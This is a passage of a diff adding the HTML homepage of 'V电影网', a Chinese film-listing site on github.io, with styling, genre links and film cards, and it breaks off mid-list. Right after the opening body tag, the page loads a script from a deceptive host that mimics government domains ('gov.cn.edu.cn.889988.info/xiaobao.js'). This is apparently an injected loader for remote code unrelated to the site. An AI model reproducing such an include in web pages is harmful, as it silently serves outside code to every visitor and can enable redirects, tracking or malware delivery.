@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>V电影网 - 影视片单推荐、剧集更新追踪与观影榜单</title>
+<meta name="description" content="V电影网(vdianyingwang-cn.github.io)收录剧情、悬疑、纪录与剧集片单，配剧集更新追踪、观影榜单与选片笔记，全站移动端自适应，打开就能挑一部。">
+<meta name="keywords" content="V电影网,v电影网,影视片单,剧集更新追踪,观影榜单,选片笔记,影视推荐,影视导航">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="author" content="V电影网">
+<meta name="theme-color" content="#c05a3e">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://vdianyingwang-cn.github.io/">
+<link rel="apple-touch-icon" href="/favicon.ico">
+<link rel="alternate" hreflang="zh-CN" href="https://vdianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="V电影网">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="V电影网 - 影视片单推荐、剧集更新追踪与观影榜单">
+<meta property="og:description" content="V电影网：剧情、悬疑、纪录与剧集片单，剧集更新追踪与选片笔记。">
+<meta property="og:url" content="https://vdianyingwang-cn.github.io/">
+<meta property="og:image" content="https://vdianyingwang-cn.github.io/favicon.ico">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="V电影网 - 影视片单推荐、剧集更新追踪与观影榜单">
+<meta name="twitter:description" content="V电影网：剧情、悬疑、纪录与剧集片单，剧集更新追踪与选片笔记。">
+<style>
+:root{
+  --bg:#f5f0e6;
+  --card:#fffdf9;
+  --rock:#c05a3e;
+  --rock2:#8a3f2c;
+  --ink:#2b3a4a;
+  --ink2:#5c6a78;
+  --ink3:#98a3ae;
+  --gold:#e0a83c;
+  --moss:#5f8a5a;
+  --slate:#6b7b8c;
+  --line:rgba(43,58,74,.14);
+  --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  --serif:"Noto Serif SC","Source Han Serif SC",Songti SC,SimSun,serif;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Courier New",monospace;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth;scroll-padding-top:58px}
+body{
+  margin:0;padding:0;color:var(--ink);background:var(--bg);font-family:var(--sans);font-size:16px;line-height:1.75;
+  background-image:repeating-linear-gradient(0deg,rgba(192,90,62,.05) 0 1px,transparent 1px 9px);
+}
+a{color:inherit;text-decoration:none}
+ul,ol{margin:0;padding:0;list-style:none}
+h1,h2,h3,h4{margin:0;line-height:1.42}
+p{margin:0}
+img{max-width:100%;display:block}
+.wrap{width:100%;max-width:1140px;margin:0 auto;padding:0 20px}
+
+/* 岩层条 */
+.strata{height:14px;border-radius:3px;
+  background:repeating-linear-gradient(0deg,var(--rock2) 0 2px,var(--rock) 2px 4px,#d9814f 4px 6px,#e6b083 6px 7px,var(--gold) 7px 8px,#a9b7a0 8px 10px,var(--moss) 10px 11px,var(--slate) 11px 13px,#8a9aa8 13px 14px);
+  opacity:.9}
+
+/* 岩层徽章 */
+.badge{position:relative;width:44px;height:44px;flex:0 0 auto;border-radius:8px;overflow:hidden;
+  background:repeating-linear-gradient(0deg,var(--rock2) 0 3px,var(--rock) 3px 7px,#d9814f 7px 10px,var(--gold) 10px 12px,var(--moss) 12px 15px,var(--slate) 15px 18px,#c9b8a2 18px 22px);
+  box-shadow:0 3px 9px rgba(138,63,44,.26)}
+.badge b{position:absolute;inset:5px;border-radius:4px;background:var(--card);color:var(--ink);
+  display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-size:15px;font-weight:900}
+.badge.v2{background:repeating-linear-gradient(0deg,#2b3a4a 0 3px,#41556a 3px 7px,#6b7b8c 7px 10px,#e0a83c 10px 12px,#8a9aa8 12px 16px,#c9b8a2 16px 22px)}
+.badge.v3{background:repeating-linear-gradient(0deg,#3f5c46 0 3px,var(--moss) 3px 7px,#8fb383 7px 10px,var(--gold) 10px 12px,#c9b8a2 12px 16px,#a9b7a0 16px 22px)}
+.badge.v4{background:repeating-linear-gradient(0deg,#6b4a86 0 3px,#8f6aa8 3px 7px,#c0a3d4 7px 10px,var(--gold) 10px 12px,#c9b8a2 12px 16px,#b0a0b8 16px 22px)}
+.badge.v5{background:repeating-linear-gradient(0deg,#1f5a6b 0 3px,#2f7d92 3px 7px,#79b3c4 7px 10px,var(--gold) 10px 12px,#c9b8a2 12px 16px,#a9b7a0 16px 22px)}
+.badge.v6{background:repeating-linear-gradient(0deg,#7a4a2b 0 3px,#a26a3c 3px 7px,#d0a06a 7px 10px,var(--gold) 10px 12px,#c9b8a2 12px 16px,#cbb49a 16px 22px)}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:80;background:rgba(245,240,230,.93);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line)}
+.topbar .in{display:flex;align-items:center;gap:16px;height:60px}
+.brand{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.brand .lg{width:36px;height:36px;border-radius:8px;background:linear-gradient(150deg,var(--rock),var(--rock2));
+  display:flex;align-items:center;justify-content:center;color:#fff;font-family:var(--mono);font-size:19px;
+  font-weight:900;box-shadow:0 3px 10px rgba(138,63,44,.3)}
+.brand b{font-family:var(--serif);font-size:20px;font-weight:900;letter-spacing:2px}
+.brand b em{font-style:normal;color:var(--rock2)}
+.tnav{display:flex;gap:3px;flex:1;min-width:0;overflow-x:auto;scrollbar-width:none}
+.tnav::-webkit-scrollbar{display:none}
+.tnav a{white-space:nowrap;font-size:13.5px;font-weight:700;color:var(--ink2);padding:6px 11px;border-radius:8px}
+.tnav a:hover{background:rgba(192,90,62,.1);color:var(--rock2)}
+.tnav a.on{background:var(--rock);color:#fff}
+.tsearch{flex:0 0 auto;display:flex;align-items:center;gap:6px;border:1.5px solid var(--line);border-radius:999px;
+  padding:5px 12px;background:var(--card)}
+.tsearch input{border:0;outline:0;width:118px;font-size:13px;background:transparent;color:var(--ink)}
+.tsearch span{color:var(--rock);font-size:13px}
+
+/* Hero：峡谷剖面 */
+.hero{display:grid;grid-template-columns:1.02fr .98fr;gap:22px;margin-top:20px}
+.canyon{border-radius:22px;overflow:hidden;background:var(--card);border:1px solid var(--line);
+  box-shadow:0 14px 34px rgba(43,58,74,.12);position:relative}
+.canyon svg{display:block;width:100%;height:auto}
+.canyon .tag{position:absolute;left:16px;top:14px;background:var(--card);border:1px solid var(--line);
+  border-radius:999px;padding:4px 12px;font-family:var(--mono);font-size:10.5px;font-weight:900;letter-spacing:2.6px;
+  color:var(--rock2)}
+.hero .side{display:flex;flex-direction:column;justify-content:center}
+.hero .eyebrow{font-family:var(--mono);font-size:10.5px;font-weight:900;letter-spacing:4px;color:var(--rock2)}
+.hero h1{font-family:var(--serif);font-size:clamp(30px,4.2vw,42px);font-weight:900;letter-spacing:3px;margin-top:8px}
+.hero h1 em{font-style:normal;color:var(--rock)}
+.hero .desc{font-size:14.4px;color:var(--ink2);margin-top:10px;max-width:44ch}
+.hero .cta{display:flex;gap:10px;margin-top:16px}
+.btn{border-radius:10px;padding:11px 16px;font-weight:900;font-size:14px;transition:.22s}
+.btn.p{background:linear-gradient(135deg,var(--rock),var(--rock2));color:#fff;box-shadow:0 6px 16px rgba(138,63,44,.28)}
+.btn.o{border:1.5px solid var(--rock);color:var(--rock2);background:var(--card)}
+.btn:hover{transform:translateY(-2px)}
+/* V 形数据：中间最低 */
+.vstat{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:18px;align-items:start}
+.vstat div{border:1px solid var(--line);border-radius:14px;background:var(--card);padding:12px 10px;text-align:center;
+  box-shadow:0 4px 12px rgba(43,58,74,.07)}
+.vstat div:nth-child(1){margin-top:0}
+.vstat div:nth-child(2){margin-top:34px;background:linear-gradient(160deg,var(--card),#f7e6d6);border-color:var(--rock)}
+.vstat div:nth-child(3){margin-top:0}
+.vstat b{display:block;font-family:var(--mono);font-size:22px;font-weight:900;color:var(--rock2);line-height:1.2}
+.vstat span{font-size:11.5px;color:var(--ink2)}
+.vstat i{display:block;font-style:normal;font-family:var(--mono);font-size:9.5px;letter-spacing:1.6px;color:var(--ink3);margin-top:2px}
+
+/* 区块 */
+.sec{padding:34px 0 6px}
+.shead{display:flex;align-items:center;gap:14px;margin-bottom:18px}
+.shead h2{font-family:var(--serif);font-size:23px;font-weight:900;letter-spacing:3px}
+.shead .en{font-family:var(--mono);font-size:10px;font-weight:900;letter-spacing:3px;color:var(--ink3);display:block;margin-top:1px}
+.shead .more{margin-left:auto;font-size:13px;font-weight:900;color:var(--rock2);border-bottom:1.5px solid var(--rock);padding-bottom:1px}
+
+/* 等高线分类 */
+.contours{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.con{border:1px solid var(--line);border-radius:18px;background:var(--card);padding:14px 10px 13px;text-align:center;
+  transition:.24s}
+.con:hover{transform:translateY(-4px);box-shadow:0 12px 26px rgba(43,58,74,.13)}
+.con .ring{width:62px;height:62px;margin:0 auto;border-radius:50%;position:relative;overflow:hidden;
+  background:repeating-radial-gradient(circle at 50% 46%,transparent 0 5px,rgba(43,58,74,.16) 5px 6px)}
+.con .ring::after{content:"";position:absolute;inset:0;border-radius:50%;
+  background:radial-gradient(circle at 50% 46%,rgba(255,255,255,.92) 0 26%,transparent 27%)}
+.con .ring b{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--serif);
+  font-size:15px;font-weight:900;color:var(--ink);z-index:2}
+.con.c1 .ring{background:repeating-radial-gradient(circle at 50% 46%,transparent 0 5px,rgba(192,90,62,.3) 5px 6px)}
+.con.c2 .ring{background:repeating-radial-gradient(circle at 50% 46%,transparent 0 5px,rgba(95,138,90,.3) 5px 6px)}
+.con.c3 .ring{background:repeating-radial-gradient(circle at 50% 46%,transparent 0 5px,rgba(224,168,60,.34) 5px 6px)}
+.con.c4 .ring{background:repeating-radial-gradient(circle at 50% 46%,transparent 0 5px,rgba(107,123,140,.34) 5px 6px)}
+.con .nm{font-size:13px;font-weight:900;margin-top:8px}
+.con .alt{font-family:var(--mono);font-size:9.5px;font-weight:900;letter-spacing:1.4px;color:var(--ink3)}
+
+/* V 形交错片单 */
+.vgrid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.vcard{display:block;border:1px solid var(--line);border-radius:18px;background:var(--card);overflow:hidden;
+  transition:.24s}
+.vcard:hover{transform:translateY(-5px);box-shadow:0 14px 30px rgba(43,58,74,.14)}
+.vgrid a:nth-child(1){margin-top:0}
+.vgrid a:nth-child(2){margin-top:76px}
+.vgrid a:nth-child(3){margin-top:26px}
+.vgrid a:nth-child(4){margin-top:50px}
+.vgrid a:nth-child(5){margin-top:50px}
+.vgrid a:nth-child(6){margin-top:26px}
+.vgrid a:nth-child(7){margin-top:76px}
+.vgrid a:nth-child(8){margin-top:0}
+.vcard .ph{position:relative;aspect-ratio:16/9;overflow:hidden}
+.vcard .ph::before{content:"";position:absolute;inset:0;opacity:.34;
+  background-image:repeating-linear-gradient(0deg,rgba(255,255,255,.28) 0 2px,transparent 2px 9px)}
+.vcard .ph::after{content:"";position:absolute;inset:0;
+  background:radial-gradient(110% 80% at 24% 12%,rgba(255,255,255,.36),transparent 60%)}
+.g1{background:linear-gradient(150deg,#d9814f,#8a3f2c)}
+.g2{background:linear-gradient(150deg,#8fb383,#3f5c46)}
+.g3{background:linear-gradient(150deg,#e6c579,#a5762a)}
+.g4{background:linear-gradient(150deg,#a9c0d4,#3f5a72)}
+.g5{background:linear-gradient(150deg,#c0a3d4,#6b4a86)}
+.g6{background:linear-gradient(150deg,#e8a48c,#a4472f)}
+.g7{background:linear-gradient(150deg,#9fb8a8,#47614f)}
+.g8{background:linear-gradient(150deg,#cdbba4,#7a6045)}
+.vcard .mk{position:absolute;left:10px;top:10px;z-index:3;font-size:11px;font-weight:900;letter-spacing:1px;
+  padding:3px 10px;border-radius:999px;background:rgba(255,253,249,.94);color:var(--rock2)}
+.vcard .sc{position:absolute;right:10px;bottom:10px;z-index:3;font-family:var(--mono);font-size:13px;font-weight:900;
+  color:#fff;background:rgba(43,58,74,.6);padding:2px 9px;border-radius:999px}
+.vcard .bd{padding:13px 15px 15px}
+.vcard .bd h3{font-family:var(--serif);font-size:17px;font-weight:900;letter-spacing:1px}
+.vcard .bd .meta{font-family:var(--mono);font-size:10.5px;letter-spacing:1.2px;color:var(--ink3);margin-top:3px}
+.vcard .bd p{font-size:13.2px;color:var(--ink2);margin-top:7px}
+.vcard .bd .ln{margin-top:10px;padding-top:9px;border-top:1px dashed var(--line);display:flex;justify-content:space-between;
+  font-family:var(--mono);font-size:10px;font-weight:900;letter-spacing:1.2px;color:var(--ink3)}
+
+/* 海拔阶梯追踪 */
+.steps{border:1px solid var(--line);border-radius:20px;background:var(--card);padding:18px 20px 20px}
+.step{display:flex;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.step:last-child{border-bottom:0}
+.step .alt{flex:0 0 62px;font-family:var(--mono);font-weight:900;color:var(--rock2)}
+.step .alt b{display:block;font-size:19px;line-height:1.1}
+.step .alt span{font-size:9.5px;letter-spacing:1.4px;color:var(--ink3)}
+.step .bd{flex:1;min-width:0}
+.step .bd h3{font-size:15px;font-weight:900;line-height:1.55}
+.step .bd p{font-size:12.8px;color:var(--ink2);margin-top:4px}
+.step .bd .bar{margin-top:8px;height:8px;border-radius:999px;background:#efe8dc;overflow:hidden}
+.step .bd .bar i{display:block;height:100%;border-radius:999px;
+  background:repeating-linear-gradient(90deg,var(--rock) 0 10px,var(--rock2) 10px 20px)}
+.step .go{flex:0 0 auto;display:flex;align-items:center;font-family:var(--mono);font-size:10px;font-weight:900;
+  letter-spacing:1.4px;color:var(--ink3)}
+.step.done .go{color:var(--moss)}
+.steps .st1{padding-left:0}
+.steps .st2{padding-left:26px}
+.steps .st3{padding-left:52px}
+.steps .st4{padding-left:78px}
+.steps .st5{padding-left:104px}
+
+/* V 形柱榜 + 列表 */
+.vrank{display:grid;grid-template-columns:1.08fr .92fr;gap:20px}
+.vbox{border:1px solid var(--line);border-radius:20px;background:var(--card);padding:18px 20px 20px}
+.vbars{display:flex;align-items:flex-end;justify-content:space-between;gap:8px;height:132px;padding:0 4px;
+  border-bottom:2px solid var(--line)}
+.vbars span{flex:1;border-radius:8px 8px 0 0;position:relative;
+  background:repeating-linear-gradient(0deg,var(--rock) 0 6px,var(--rock2) 6px 12px)}
+.vbars span b{position:absolute;left:0;right:0;top:-19px;text-align:center;font-family:var(--mono);font-size:11px;
+  font-weight:900;color:var(--ink2)}
+.vbars span:nth-child(4){background:repeating-linear-gradient(0deg,var(--gold) 0 6px,#a5762a 6px 12px)}
+.vbars span:nth-child(1),.vbars span:nth-child(7){background:repeating-linear-gradient(0deg,#8fb383 0 6px,#3f5c46 6px 12px)}
+.vrow{display:flex;align-items:center;gap:14px;padding:11px 0;border-bottom:1px dashed var(--line)}
+.vrow:last-child{border-bottom:0}
+.vrow .no{flex:0 0 34px;text-align:center;font-family:var(--mono);font-size:20px;font-weight:900;color:#e2d8c8}
+.vrow:nth-child(-n+3) .no{color:var(--rock)}
+.vrow .nm{flex:1;min-width:0}
+.vrow .nm b{font-family:var(--serif);font-size:16.2px;font-weight:900;letter-spacing:1px}
+.vrow .nm span{display:block;font-family:var(--mono);font-size:10.5px;letter-spacing:1.2px;color:var(--ink3);margin-top:1px}
+.vrow .sc{font-family:var(--mono);font-size:15px;font-weight:900;color:var(--rock2)}
+.guide{display:grid;gap:12px;align-content:start}
+.gd{border:1px solid var(--line);border-radius:16px;background:var(--card);padding:14px 16px;border-left:5px solid var(--rock)}
+.gd:nth-child(2){border-left-color:var(--moss)}
+.gd:nth-child(3){border-left-color:var(--gold)}
+.gd:nth-child(4){border-left-color:var(--slate)}
+.gd h4{font-family:var(--serif);font-size:15.6px;font-weight:900;letter-spacing:1.4px}
+.gd p{font-size:13.2px;color:var(--ink2);margin-top:5px}
+
+/* 资讯 */
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.ncard{border:1px solid var(--line);border-radius:18px;background:var(--card);overflow:hidden;display:flex;
+  flex-direction:column;transition:.24s}
+.ncard:hover{transform:translateY(-5px);box-shadow:0 14px 26px rgba(43,58,74,.13)}
+.ncard .ph{aspect-ratio:16/9;position:relative}
+.ncard .ph::before{content:"";position:absolute;inset:0;opacity:.3;
+  background-image:repeating-radial-gradient(circle at 50% 60%,transparent 0 7px,rgba(255,255,255,.4) 7px 8px)}
+.ncard .bd{padding:14px 16px 16px;flex:1;display:flex;flex-direction:column}
+.ncard h3{font-family:var(--serif);font-size:16.4px;font-weight:900;letter-spacing:1px}
+.ncard p{font-size:13px;color:var(--ink2);margin-top:7px;flex:1}
+.ncard .ft{margin-top:9px;font-family:var(--mono);font-size:10px;font-weight:900;letter-spacing:1.2px;color:var(--ink3)}
+
+/* 关于 + FAQ */
+.ag{display:grid;grid-template-columns:1.06fr .94fr;gap:20px}
+.about{border-radius:20px;padding:24px 24px 22px;color:#fff;position:relative;overflow:hidden;
+  background:linear-gradient(150deg,#8a3f2c 0%,#c05a3e 52%,#a5762a 100%)}
+.about::after{content:"";position:absolute;width:230px;height:230px;border-radius:50%;right:-72px;bottom:-96px;
+  background:repeating-radial-gradient(circle,rgba(255,255,255,.16) 0 6px,transparent 6px 13px)}
+.about h2{font-family:var(--serif);font-size:22px;font-weight:900;letter-spacing:3px}
+.about p{font-size:14.2px;margin-top:11px;opacity:.97;position:relative;z-index:2}
+.about .note{margin-top:14px;padding:11px 14px;border-radius:12px;background:rgba(255,255,255,.16);font-size:13px;
+  position:relative;z-index:2}
+.faq{border:1px solid var(--line);border-radius:20px;background:var(--card);padding:6px 0}
+.faq details{border-bottom:1px dashed var(--line)}
+.faq details:last-child{border-bottom:0}
+.faq summary{cursor:pointer;list-style:none;padding:14px 20px;font-size:14.6px;font-weight:900;display:flex;
+  justify-content:space-between;gap:12px;align-items:flex-start}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";color:var(--rock);flex:0 0 auto;font-weight:900}
+.faq details[open] summary::after{content:"－"}
+.faq details[open] summary{color:var(--rock2)}
+.faq .ans{padding:0 20px 15px;font-size:13.4px;color:var(--ink2)}
+
+/* 页脚 */
+.foot{margin-top:30px;padding:26px 0 30px;border-top:1px solid var(--line);background:rgba(255,253,249,.6)}
+.foot .grid4{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:20px}
+.foot .fb{font-family:var(--serif);font-size:22px;font-weight:900;letter-spacing:3px}
+.foot .fb em{font-style:normal;color:var(--rock2)}
+.foot .fd{font-size:12.8px;color:var(--ink2);margin-top:9px;max-width:38ch}
+.foot h4{font-family:var(--mono);font-size:10px;font-weight:900;letter-spacing:3px;color:var(--rock2);margin-bottom:9px}
+.foot a{display:block;font-size:13.2px;color:var(--ink2);padding:2.5px 0}
+.foot a:hover{color:var(--rock2)}
+.foot .copy{margin-top:20px;padding-top:14px;border-top:1px dashed var(--line);font-family:var(--mono);font-size:10.5px;
+  letter-spacing:1.2px;color:var(--ink3);display:flex;flex-wrap:wrap;gap:8px;justify-content:space-between}
+
+/* 移动端 */
+.tabbar{display:none}
+@media (max-width:1000px){
+  .contours{grid-template-columns:repeat(4,1fr)}
+  .vrank,.ag{grid-template-columns:1fr}
+  .news{grid-template-columns:1fr 1fr}
+}
+@media (max-width:760px){
+  .hero{grid-template-columns:1fr;gap:16px}
+  .hero .desc{max-width:none}
+  .vstat div:nth-child(2){margin-top:20px}
+}
+@media (max-width:640px){
+  body{font-size:15.5px}
+  .wrap{padding:0 14px}
+  .tnav{display:none}
+  .tsearch input{width:86px}
+  .topbar .in{height:52px;gap:10px}
+  .brand b{font-size:18px}
+  .hero{margin-top:12px}
+  .hero h1{font-size:31px;letter-spacing:2px}
+  .hero .desc{font-size:13.6px}
+  .vstat{grid-template-columns:1fr;gap:8px}
+  .vstat div:nth-child(2){margin-top:0}
+  .vstat b{font-size:19px}
+  .sec{padding:24px 0 4px}
+  .shead{gap:10px;margin-bottom:14px}
+  .shead h2{font-size:19px;letter-spacing:2px}
+  .badge{width:40px;height:40px}
+  .badge b{inset:4px;font-size:14px}
+  .contours{grid-template-columns:repeat(3,1fr);gap:10px}
+  .con .ring{width:54px;height:54px}
+  .con .ring b{font-size:13.6px}
+  .con .nm{font-size:12.4px}
+  .vgrid{grid-template-columns:1fr;gap:14px}
+  .vgrid a:nth-child(n){margin-top:0}
+  .steps{padding:14px 14px 16px}
+  .step{gap:10px}
+  .step .alt{flex:0 0 52px}
+  .step .alt b{font-size:17px}
+  .steps .st2{padding-left:10px}
+  .steps .st3{padding-left:20px}
+  .steps .st4{padding-left:30px}
+  .steps .st5{padding-left:40px}
+  .vbars{height:104px;gap:5px}
+  .vbars span b{font-size:10px;top:-17px}
+  .vrow{gap:10px;padding:9px 0}
+  .vrow .no{font-size:17px;flex:0 0 28px}
+  .vrow .nm b{font-size:15.2px}
+  .news{grid-template-columns:1fr;gap:14px}
+  .about{padding:20px 18px}
+  .about h2{font-size:19px;letter-spacing:2px}
+  .foot{padding-bottom:96px}
+  .foot .grid4{grid-template-columns:1fr 1fr;gap:14px}
+  .foot .fb{font-size:19px;letter-spacing:2px}
+  .foot .copy{flex-direction:column;align-items:flex-start}
+  .tabbar{display:flex;position:fixed;left:0;right:0;bottom:0;z-index:85;background:rgba(245,240,230,.97);
+    backdrop-filter:blur(10px);border-top:2px solid var(--rock);
+    padding:5px 2px calc(5px + env(safe-area-inset-bottom))}
+  .tabbar a{flex:1;display:flex;flex-direction:column;align-items:center;gap:1px;font-size:11px;font-weight:900;
+    color:var(--ink3);padding:5px 0}
+  .tabbar a i{font-style:normal;font-size:15px;line-height:1.1}
+  .tabbar a.on{color:#fff;background:linear-gradient(135deg,var(--rock),var(--rock2));border-radius:12px}
+  .backtop{display:flex;position:fixed;right:12px;bottom:74px;z-index:75;width:42px;height:42px;border-radius:12px;
+    align-items:center;justify-content:center;background:linear-gradient(140deg,var(--rock),var(--rock2));color:#fff;
+    font-family:var(--mono);font-size:10px;font-weight:900;box-shadow:0 6px 16px rgba(138,63,44,.35)}
+}
+@media (min-width:641px){.backtop{display:none}}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="in">
+      <a class="brand" href="#"><span class="lg">V</span><b><em>V</em>电影网</b></a>
+      <nav class="tnav" aria-label="站点导航">
+        <a href="#" class="on">封面</a>
+        <a href="#genre">类型等高线</a>
+        <a href="#film">电影片单</a>
+        <a href="#track">更新追踪</a>
+        <a href="#rank">观影榜单</a>
+        <a href="#news">资讯</a>
+        <a href="#about">关于</a>
+      </nav>
+      <form class="tsearch" action="#" onsubmit="return false">
+        <label for="kw" style="position:absolute;left:-9999px">检索片名</label>
+        <input id="kw" type="search" placeholder="检索片名">
+        <span>⌕</span>
+      </form>
+    </div>
+  </div>
+</header>
+
+<main>
+  <!-- Hero：峡谷剖面 -->
+  <section class="wrap" style="padding-top:0" aria-labelledby="hero-title">
+    <div class="hero">
+      <div class="canyon">
+        <span class="tag">V · CANYON SECTION</span>
+        <svg viewBox="0 0 520 250" role="img" aria-label="V 形峡谷剖面示意图，两侧为高地，中间为河谷">
+          <defs>
+            <linearGradient id="vsky" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0" stop-color="#fbe7c9"/><stop offset="1" stop-color="#f4dcbb"/>
+            </linearGradient>
+            <linearGradient id="vrock" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0" stop-color="#c05a3e"/><stop offset="1" stop-color="#7d3826"/>
+            </linearGradient>
+            <linearGradient id="vfar" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0" stop-color="#dcc7a8"/><stop offset="1" stop-color="#c9b596"/>
+            </linearGradient>
+          </defs>
+          <rect width="520" height="250" fill="url(#vsky)"/>
+          <circle cx="398" cy="56" r="30" fill="#e0a83c" opacity=".82"/>
+          <path d="M0 148 L84 96 L146 132 L212 82 L282 138 L338 102 L412 144 L520 90 L520 250 L0 250Z" fill="url(#vfar)" opacity=".72"/>
+          <path d="M0 166 L92 148 L166 176 L232 212 L268 236 L302 208 L358 170 L432 150 L520 168 L520 250 L0 250Z" fill="url(#vrock)"/>
+          <path d="M0 182 L92 166 L166 192 L232 226 L268 248 L302 222 L358 186 L432 168 L520 184" fill="none" stroke="#fbe7c9" stroke-width="1.4" opacity=".5"/>
+          <path d="M0 196 L92 182 L166 206 L232 238 L268 258 L302 234 L358 200 L432 184 L520 198" fill="none" stroke="#fbe7c9" stroke-width="1.1" opacity=".35"/>
+          <path d="M0 208 L92 196 L166 218 L232 246 L268 266 L302 242 L358 212 L432 196 L520 210" fill="none" stroke="#fbe7c9" stroke-width="1" opacity=".28"/>
+          <path d="M232 212 L268 236 L302 208" fill="none" stroke="#4f7fa8" stroke-width="4" opacity=".85"/>
+          <circle cx="92" cy="148" r="4" fill="#2b3a4a"/>
+          <circle cx="268" cy="236" r="4" fill="#2b3a4a"/>
+          <circle cx="432" cy="150" r="4" fill="#2b3a4a"/>
+          <text x="80" y="134" font-family="ui-monospace,monospace" font-size="11" font-weight="700" fill="#2b3a4a">西脊 820m</text>
+          <text x="232" y="228" font-family="ui-monospace,monospace" font-size="11" font-weight="700" fill="#2b3a4a">谷底 240m</text>
+          <text x="392" y="136" font-family="ui-monospace,monospace" font-size="11" font-weight="700" fill="#2b3a4a">东脊 760m</text>
+        </svg>
+      </div>
+      <div class="side">
+        <span class="eyebrow">V · FILM INDEX</span>
+        <h1 id="hero-title"><em>V</em>电影网 · 从谷底一路看到山脊</h1>
+        <p class="desc">V电影网收录剧情、悬疑、纪录与剧集片单，配剧集更新追踪、观影榜单与选片笔记。首页一次看清当天有哪些新片与更新，打开就能挑一部。</p>
+        <div class="cta">
+          <a class="btn p" href="#film">挑一部来看</a>
+          <a class="btn o" href="#track">加入追踪</a>
+        </div>
+        <div class="vstat">
+          <div><b>26</b><span>今日上新</span><i>NEW</i></div>
+          <div><b>15</b><span>剧集更新</span><i>UPDATE</i></div>
+          <div><b>6</b><span>本站专题</span><i>TOPIC</i></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="wrap"><div class="strata" aria-hidden="true"></div></div>
+
+  <!-- 类型等高线 -->
+  <section class="sec wrap" id="genre" aria-labelledby="genre-title">
+    <div class="shead">
+      <span class="badge"><b>壹</b></span>
+      <span><h2 id="genre-title">类型等高线</h2><span class="en">GENRE CONTOUR</span></span>
+      <a class="more" href="#">全部类型 →</a>
+    </div>
+    <div class="contours">
+      <a class="con c1" href="#"><span class="ring"><b>剧情</b></span><span class="nm" style="display:block">剧情</span><span class="alt">DRAMA · 820m</span></a>
+      <a class="con c2" href="#"><span class="ring"><b>悬疑</b></span><span class="nm" style="display:block">悬疑</span><span class="alt">THRILL · 760m</span></a>
+      <a class="con c3" href="#"><span class="ring"><b>纪录</b></span><span class="nm" style="display:block">纪录</span><span class="alt">DOC · 640m</span></a>
+      <a class="con c4" href="#"><span class="ring"><b>动画</b></span><span class="nm" style="display:block">动画</span><span class="alt">ANIME · 520m</span></a>
+      <a class="con c1" href="#"><span class="ring"><b>爱情</b></span><span class="nm" style="display:block">爱情</span><span class="alt">ROMANCE · 480m</span></a>
+      <a class="con c2" href="#"><span class="ring"><b>喜剧</b></span><span class="nm" style="display:block">喜剧</span><span class="alt">COMEDY · 440m</span></a>
+      <a class="con c3" href="#"><span class="ring"><b>科幻</b></span><span class="nm" style="display:block">科幻</span><span class="alt">SCI-FI · 400m</span></a>
+      <a class="con c4" href="#"><span class="ring"><b>动作</b></span><span class="nm" style="display:block">动作</span><span class="alt">ACTION · 360m</span></a>
+      <a class="con c1" href="#"><span class="ring"><b>文艺</b></span><span class="nm" style="display:block">文艺</span><span class="alt">ART · 320m</span></a>
+      <a class="con c2" href="#"><span class="ring"><b>国产剧</b></span><span class="nm" style="display:block">国产剧</span><span class="alt">CN · 280m</span></a>
+      <a class="con c3" href="#"><span class="ring"><b>日韩剧</b></span><span class="nm" style="display:block">日韩剧</span><span class="alt">JP/KR · 260m</span></a>
+      <a class="con c4" href="#"><span class="ring"><b>经典</b></span><span class="nm" style="display:block">经典佳片</span><span class="alt">CLASSIC · 240m</span></a>
+    </div>
+  </section>
+
+  <!-- V 形交错片单 -->
+  <section class="sec wrap" id="film" aria-labelledby="film-title">
+    <div class="shead">
+      <span class="badge v2"><b>贰</b></span>
+      <span><h2 id="film-title">电影片单</h2><span class="en">FILM LIST</span></span>
+      <a class="more" href="#">查看全部 →</a>
+    </div>
+    <div class="vgrid">
+      <a class="vcard" href="#">
+        <span class="ph g1"><span class="mk">今日头条</span><span class="sc">9.1</span></span>
+        <div class="bd"><h3>谷底的回声</h3><div class="meta">2025 · 剧情 / 悬疑 · 118 分钟</div>
+        <p>一场山洪过后，小镇上的人各自说出自己的那一夜。</p>
+        <div class="ln"><span>今日推荐</span><span>V-01</span></div></div>
+      </a>
+      <a class="vcard" href="#">
+        <span class="ph g2"><span class="mk">想看</span><span class="sc">8.9</span></span>
+        <div class="bd"><h3>西脊未命名</h3><div class="meta">2024 · 纪录 / 自然 · 96 分钟</div>
+        <p>一支测绘队沿山脊走了四十天，把地形记进了本子。</p>
+        <div class="ln"><span>纪录</span><span>V-02</span></div></div>
+      </a>
